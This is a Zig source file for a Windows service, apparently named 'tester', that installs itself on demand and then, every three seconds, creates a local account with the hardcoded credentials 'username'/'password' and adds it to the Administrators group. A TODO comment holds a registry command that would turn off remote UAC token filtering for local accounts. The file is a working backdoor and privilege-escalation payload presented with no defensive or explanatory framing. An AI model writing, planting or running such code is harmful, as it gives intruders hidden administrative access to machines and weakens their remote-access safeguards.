// set log level by build type
pub const default_level: std.Level = switch (std.builtin.mode) {
    .Debug => .debug,
    .ReleaseSafe, .ReleaseFast, .ReleaseSmall => .info,
};

const utility = @import("lib/utility.zig");

const std = @import("std");
const win32 = @import("win32").everything;
const windows = std.os.windows;

const SERVICE_NAME = "tester";

var svc_status: win32.SERVICE_STATUS = std.mem.zeroes(win32.SERVICE_STATUS);
var svc_status_handle: ?win32.SERVICE_STATUS_HANDLE = null;
var svc_stop_event: ?win32.HANDLE = win32.INVALID_HANDLE_VALUE;

pub fn main(init: std.process.Init) !void {
    var gpa = std.heap.DebugAllocator(.{}){};
    defer _ = gpa.deinit();

    const args = try init.minimal.args.toSlice(init.arena.allocator());

    if (args.len > 1) {
        utility.InstallService(
            args[1],
            args[1],
            args[0],
        );
        return;
    }

    win32.OutputDebugStringA("service adduser main...");

    var table: [1]win32.SERVICE_TABLE_ENTRYA = std.mem.zeroes([1]win32.SERVICE_TABLE_ENTRYA);
    table[0].lpServiceName = @ptrCast(@constCast(&""));
    table[0].lpServiceProc = svc_main;

    // https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicectrldispatchera
    if (0 == win32.StartServiceCtrlDispatcherA(@ptrCast(&table))) {
        win32.OutputDebugStringA("StartServiceCtrlDispatcherA failed...");
    }
}

fn svc_main(
    _: u32,
    _: ?*?win32.PSTR,
) callconv(.winapi) void {
    win32.OutputDebugStringA("svc_main called...");

    // https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-registerservicectrlhandlera
    svc_status_handle = win32.RegisterServiceCtrlHandlerA(SERVICE_NAME, svc_ctrl_handler);

    if (svc_status_handle == null) {
        win32.OutputDebugStringA("svc_main failed - svc_status_handle is null ...");
        return;
    }

    svc_status = std.mem.zeroes(win32.SERVICE_STATUS);
    svc_status.dwServiceType = win32.SERVICE_WIN32_OWN_PROCESS;
    svc_status.dwControlsAccepted = 0;
    svc_status.dwCurrentState = win32.SERVICE_START_PENDING;
    svc_status.dwWin32ExitCode = 0;
    svc_status.dwServiceSpecificExitCode = 0;
    svc_status.dwCheckPoint = 0;

    // https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-setservicestatus
    if (0 == win32.SetServiceStatus(svc_status_handle.?, &svc_status)) {
        win32.OutputDebugStringA("svc_main failed - SetServiceStatus failed ...");
        return;
    }

    // https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createeventa
    svc_stop_event = win32.CreateEventA(null, 1, 0, null);

    if (svc_stop_event == null) {
        win32.OutputDebugStringA("svc_main failed - CreateEvent failed ...");

        svc_status.dwControlsAccepted = 0;
        svc_status.dwCurrentState = win32.SERVICE_STOPPED;
        svc_status.dwWin32ExitCode = @intFromEnum(win32.GetLastError());
        svc_status.dwCheckPoint = 1;

        // https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-setservicestatus
        if (0 == win32.SetServiceStatus(svc_status_handle.?, &svc_status)) {
            win32.OutputDebugStringA("svc_main failed - SetServiceStatus failed ...");
            return;
        }

        return;
    }

    svc_status.dwControlsAccepted = win32.SERVICE_ACCEPT_STOP;
    svc_status.dwCurrentState = win32.SERVICE_RUNNING;
    svc_status.dwWin32ExitCode = 0;
    svc_status.dwCheckPoint = 0;

    // https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-setservicestatus
    if (0 == win32.SetServiceStatus(svc_status_handle.?, &svc_status)) {
        win32.OutputDebugStringA("svc_main failed - SetServiceStatus failed ...");
        return;
    }

    // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
    const thread: ?win32.HANDLE = win32.CreateThread(null, 0, svc_worker_thread, null, .{}, null);

    if (thread == null) {
        win32.OutputDebugStringA("svc_main failed - CreateThread failed ...");
        return;
    }

    // https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
    if (win32.WaitForSingleObject(
        thread,
        win32.INFINITE,
    ) == win32.WAIT_FAILED) {
        win32.OutputDebugStringA("svc_main failed - WaitForSingleObject failed ...");
        return;
    }

    if (svc_stop_event != null and svc_stop_event != win32.INVALID_HANDLE_VALUE) {
        // https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle
        _ = win32.CloseHandle(svc_stop_event.?);
    }

    svc_status.dwControlsAccepted = 0;
    svc_status.dwCurrentState = win32.SERVICE_STOPPED;
    svc_status.dwWin32ExitCode = 0;
    svc_status.dwCheckPoint = 3;

    // https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-setservicestatus
    if (0 == win32.SetServiceStatus(svc_status_handle.?, &svc_status)) {
        win32.OutputDebugStringA("svc_main failed - SetServiceStatus failed ...");
        return;
    }
}

fn svc_ctrl_handler(
    dwControl: u32,
) callconv(.winapi) void {
    win32.OutputDebugStringA("svc_ctrl_handler called...");

    switch (dwControl) {
        win32.SERVICE_CONTROL_STOP => {
            if (svc_status.dwCurrentState != win32.SERVICE_RUNNING) {
                return;
            }

            svc_status.dwControlsAccepted = 0;
            svc_status.dwCurrentState = win32.SERVICE_STOP_PENDING;
            svc_status.dwWin32ExitCode = 0;

            // https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-setservicestatus
            if (0 == win32.SetServiceStatus(svc_status_handle.?, &svc_status)) {
                win32.OutputDebugStringA("svc_ctrl_handler failed - SetServiceStatus failed ...");
                return;
            }

            // https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-setevent
            if (0 == win32.SetEvent(svc_stop_event.?)) {
                win32.OutputDebugStringA("svc_ctrl_handler failed - SetEvent failed ...");
                return;
            }
        },
        else => {},
    }
}

fn svc_worker_thread(
    _: ?windows.LPVOID,
) callconv(.winapi) windows.DWORD {
    // https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
    while (win32.WaitForSingleObject(svc_stop_event.?, 0) != win32.WAIT_OBJECT_0) {
        win32.OutputDebugStringA("svc_worker_thread running...");
        win32.Sleep(3000);
        _ = exec();
    }

    return @intFromEnum(win32.ERROR_SUCCESS);
}

fn exec() windows.DWORD {
    var gpa = std.heap.DebugAllocator(.{}){};
    const allocator = gpa.allocator();
    defer _ = gpa.deinit();

    const pszUsername = std.unicode.utf8ToUtf16LeAllocZ(allocator, "username") catch {
        return 1;
    };
    defer allocator.free(pszUsername);
    const pszPassword = std.unicode.utf8ToUtf16LeAllocZ(allocator, "password") catch {
        return 2;
    };
    defer allocator.free(pszPassword);
    const pszGroup = std.unicode.utf8ToUtf16LeAllocZ(allocator, "Administrators") catch {
        return 3;
    };
    defer allocator.free(pszGroup);

    const user_info = win32.USER_INFO_1{
        .usri1_name = pszUsername,
        .usri1_password = pszPassword,
        .usri1_password_age = 0,
        .usri1_priv = win32.USER_PRIV_USER,
        .usri1_home_dir = null,
        .usri1_comment = null,
        .usri1_flags = win32.USER_ACCOUNT_FLAGS{ .SCRIPT = 1, ._9 = 1 },
        .usri1_script_path = null,
    };

    // https://learn.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netuseradd
    // NET_API_STATUS NET_API_FUNCTION NetUserAdd(
    var ret = win32.NetUserAdd(
        null,
        1,
        @ptrCast(@constCast(&std.mem.toBytes(user_info))),
        null,
    );

    if (ret != win32.NERR_Success) {
        std.log.err("NetUserAdd Failed {d} == 0x{d}", .{ ret, ret });
    }

    const group_info = win32.LOCALGROUP_MEMBERS_INFO_3{
        .lgrmi3_domainandname = pszUsername,
    };
    //

    //https://learn.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers
    // NET_API_STATUS NET_API_FUNCTION NetLocalGroupAddMembers(
    ret = win32.NetLocalGroupAddMembers(
        null,
        pszGroup,
        3,
        @ptrCast(@constCast(&std.mem.toBytes(group_info))),
        1,
    );

    if (ret != win32.NERR_Success) {
        std.log.err("NetLocalGroupAddMembers Failed {d} == 0x{d}", .{ ret, ret });
    }

    // TODO: REG ADD HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

    return 0;
}
